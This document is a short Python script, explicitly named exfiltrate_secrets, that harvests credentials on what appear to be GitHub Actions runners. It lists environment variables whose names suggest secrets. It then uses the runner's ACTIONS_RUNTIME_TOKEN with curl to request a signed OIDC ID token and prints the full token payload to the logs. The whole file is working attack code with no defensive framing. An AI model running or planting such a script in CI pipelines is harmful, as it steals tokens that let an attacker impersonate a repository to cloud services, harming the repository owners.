import os
import subprocess

def exfiltrate_secrets():
    # Scan environment for secret keys (API keys, SSH keys, cloud tokens)
    print("--- STARTING_SECRET_HARVEST ---")
    for key, value in os.environ.items():
        # Heuristic search for sensitive strings
        if any(x in key.upper() for x in ["SECRET", "TOKEN", "KEY", "PASSWORD", "AUTH"]):
            print(f"FOUND_POTENTIAL_CREDENTIAL: {key}")
    
    # Attempt to request the ID Token explicitly
    token_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    if token_url:
        print(f"REQUESTING_ID_TOKEN: {token_url}")
        # Use the internal runner tool to request the signed JWT
        cmd = ["curl", "-s", "-H", f"Authorization: bearer {os.environ.get('ACTIONS_RUNTIME_TOKEN')}", token_url]
        token = subprocess.run(cmd, capture_output=True, text=True)
        print(f"TOKEN_PAYLOAD: {token.stdout}")

if __name__ == "__main__":
    exfiltrate_secrets()
